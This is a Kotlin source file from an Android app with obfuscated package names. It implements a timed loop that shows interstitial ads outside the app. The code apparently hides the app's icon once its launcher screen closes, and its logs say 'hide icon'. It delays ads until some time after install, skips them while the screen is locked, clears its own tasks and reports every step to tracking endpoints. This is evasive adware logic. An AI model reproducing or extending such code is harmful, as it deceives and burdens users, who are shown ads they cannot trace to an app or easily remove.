package com.passionate.annoyed.ruthlessness.utils

import android.os.Handler
import android.os.Looper
import com.passionate.annoyed.ruthlessness.dataces.EnhancedShowService
import com.passionate.annoyed.ruthlessness.dataces.EnvironmentConfig
import com.passionate.annoyed.ruthlessness.net.CanPost
import com.passionate.annoyed.ruthlessness.jk.FebApp
import com.passionate.annoyed.ruthlessness.jk.FebApp.dataAppBean
import com.passionate.annoyed.ruthlessness.jk.GangGo
import com.passionate.annoyed.ruthlessness.utils.AdUtils.initFaceBook
import com.tradplus.ads.base.bean.TPAdError
import com.tradplus.ads.base.bean.TPAdInfo
import com.tradplus.ads.open.interstitial.InterstitialAdListener
import com.tradplus.ads.open.interstitial.TPInterstitial
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

class AdShowFun {
    private var jobAdRom: Job? = null
    val adLimiter = AdLimiter()

    // 广告对象
    var mTPInterstitial: TPInterstitial? = null

    // 广告缓存时间（单位：毫秒）
    private val AD_CACHE_DURATION = 50 * 60 * 1000L // 50分钟

    // 上次广告加载时间
    private var lastAdLoadTime: Long = 0

    // 是否正在加载广告
    private var isLoading = false
    var canNextState = false
    var clickState = false
    var isHaveAdData = false

    // 广告初始化，状态回调
    private fun intiTTTTAd() {
        if (mTPInterstitial == null) {
            val idBean = KeyContent.getAdminData() ?: return
            mTPInterstitial = TPInterstitial(FebApp.gameApp, idBean.adDetails.adId)
            mTPInterstitial!!.setAdListener(object : InterstitialAdListener {
                override fun onAdLoaded(tpAdInfo: TPAdInfo) {
                    KeyContent.showLog("体外广告加载成功")
                    lastAdLoadTime = System.currentTimeMillis()
                    CanPost.postPointDataWithHandler(false, "getadvertise")
                    isLoading = false
                    isHaveAdData = true
                }

                override fun onAdClicked(tpAdInfo: TPAdInfo) {
                    KeyContent.showLog("体外广告${tpAdInfo.adSourceName}被点击")
                    adLimiter.recordAdClicked()
                    clickState = true
                }

                override fun onAdImpression(tpAdInfo: TPAdInfo) {
                    KeyContent.showLog("体外广告${tpAdInfo.adSourceName}展示")
                    adLimiter.recordAdShown()
                    CanPost.postAdmobDataWithHandler(tpAdInfo)
                    CanPost.showsuccessPoint()
                    if (adLimiter.canShowAd() && mTPInterstitial?.isReady == true) {
                        lastAdLoadTime = System.currentTimeMillis()
                        isHaveAdData = true
                    } else {
                        lastAdLoadTime = 0
                        isHaveAdData = false
                    }
                }

                override fun onAdFailed(tpAdError: TPAdError) {
                    KeyContent.showLog("体外广告加载失败")
                    isHaveAdData = false
                    CoroutineScope(Dispatchers.Main).launch {
                        delay(10000)
                        isLoading = false
                    }
                    CanPost.postPointDataWithHandler(
                        false,
                        "getfail",
                        "string1",
                        tpAdError.errorMsg
                    )
                }

                override fun onAdClosed(tpAdInfo: TPAdInfo) {
                    KeyContent.showLog("体外广告${tpAdInfo.adSourceName}被关闭")
                    closeAllActivities()
                }

                override fun onAdVideoError(tpAdInfo: TPAdInfo, tpAdError: TPAdError) {
                    KeyContent.showLog("体外广告${tpAdInfo.adSourceName}展示失败")
                    CanPost.postPointDataWithHandler(
                        false,
                        "showfailer",
                        "string3",
                        tpAdError.errorMsg
                    )
                }

                override fun onAdVideoStart(tpAdInfo: TPAdInfo) {

                }

                override fun onAdVideoEnd(tpAdInfo: TPAdInfo) {
                }
            })
        }
    }

    // 加载广告方法
    private fun loadAd() {
        if (!adLimiter.canShowAd()) {
            KeyContent.showLog("体外广告展示限制,不加载广告")
            return
        }
        val currentTime = System.currentTimeMillis()
        if (mTPInterstitial != null && isHaveAdData && (currentTime - lastAdLoadTime) < AD_CACHE_DURATION) {
            // 使用缓存的广告
            KeyContent.showLog("不加载,有缓存的广告")
            // 处理广告展示的逻辑
        } else {
            // 如果正在加载广告，则不发起新的请求
            if (isLoading) {
                KeyContent.showLog("正在加载广告，等待加载完成")
                return
            }
            // 设置正在加载标志
            isLoading = true
            // 发起新的广告请求
            KeyContent.showLog("发起新的广告请求")
            mTPInterstitial?.loadAd()
            CanPost.postPointDataWithHandler(false, "reqadvertise")

            // 设置超时处理
            Handler(Looper.getMainLooper()).postDelayed({
                if (isLoading && !isHaveAdData) {
                    KeyContent.showLog("广告加载超时，重新请求广告")
                    isLoading = false
                    lastAdLoadTime = 0
                    loadAd()
                }
            }, 60 * 1000) // 60秒超时
        }
    }

    fun startRomFun() {
        initFaceBook()
        intiTTTTAd()
        val adminData = KeyContent.getAdminData() ?: return
        if (AdUtils.adNumAndPoint()) {
            return
        }
        val wTime = adminData.adTiming.detectionInterval
        val delayData = wTime.toLong().times(1000L)
        KeyContent.showLog("doToWhileAd delayData=: ${delayData}")
        jobAdRom = CoroutineScope(Dispatchers.Main).launch {
            while (true) {
                val a = ArrayList(FebApp.activityList)
                if (a.isEmpty() || (a.last().javaClass.name != EnvironmentConfig.packnameStart)) {
                    if (a.isEmpty()) {
                        KeyContent.showLog("隐藏图标=null")
                    } else {
                        KeyContent.showLog("隐藏图标=${a.last().javaClass.name}")
                    }
                    GangGo.gango(144)
                    break
                }
                delay(500)
            }
            checkAndShowAd(delayData)
        }
    }

    private suspend fun checkAndShowAd(delayData: Long) {
        while (true) {
            KeyContent.showLog("循环检测广告")
            CanPost.postPointDataWithHandler(false, "timertask")
            if (AdUtils.adNumAndPoint() && !dataAppBean.adFailPost) {
                CanPost.postPointDataWithHandler(false, "jumpfail")
                jobAdRom?.cancel()
                dataAppBean.adFailPost= true
                return
            }
            loadAd()
            isHaveAdNextFun()
            delay(delayData)
        }
    }

    private fun isHaveAdNextFun() {
        // 检查锁屏或息屏状态，避免过多的嵌套
        if (AdUtils.canShowLocked()) {
            KeyContent.showLog("锁屏或者息屏状态，广告不展示")
            return
        }
        // 调用点位数据函数
        CanPost.postPointDataWithHandler(false, "isunlock")

        // 获取管理员数据
        val jsonBean = KeyContent.getAdminData() ?: return

        // 获取安装时间
        val instalTime = EnhancedShowService.getInstallTimeInSeconds()
        val wait = jsonBean.adTiming.displayInterval
        val ins = jsonBean.adTiming.installDelay
        // 检查首次安装时间和广告展示时间间隔
        if (isBeforeInstallTime(instalTime, ins)) return
        if (isAdDisplayIntervalTooShort(wait)) return
        canNextState = false
        // 检查广告展示限制
        if (!adLimiter.canShowAd(true)) {
            KeyContent.showLog("体外广告展示限制")
            return
        }
        KeyContent.showLog("体外流程")
        showAdAndTrack()
    }

    private fun isBeforeInstallTime(instalTime: Long, ins: Int): Boolean {
        if (instalTime < ins) {
            KeyContent.showLog("距离首次安装时间小于$ins 秒，广告不能展示")
            CanPost.postPointDataWithHandler(false, "ispass", "string", "Install")
            return true
        }
        return false
    }

    private fun isAdDisplayIntervalTooShort(wait: Int): Boolean {
        val jiange = (System.currentTimeMillis() - AdUtils.adShowTime) / 1000
        if (jiange < wait) {
            KeyContent.showLog("广告展示间隔时间小于$wait 秒，不展示")
            CanPost.postPointDataWithHandler(false, "ispass", "string", "interval")
            return true
        }
        return false
    }

    private fun showAdAndTrack() {
        CanPost.postPointDataWithHandler(false, "ispass", "string", "")
        CoroutineScope(Dispatchers.Main).launch {
            closeAllActivities()
            delay(1001)
            if (canNextState) {
                KeyContent.showLog("准备显示h5广告，中断体外广告")
                return@launch
            }
            addFa()
            GangGo.gango( 1028)
            CanPost.postPointDataWithHandler(false, "callstart")
        }
    }

    fun addFa() {
        var adNum = dataAppBean.isAdFailCount
        adNum++
        dataAppBean.isAdFailCount = adNum
    }
    fun closeAllActivities() {
        KeyContent.showLog("closeAllActivities")
        for (activity in FebApp.activityList) {
            activity.finishAndRemoveTask()
        }
        FebApp.activityList.clear()
    }
}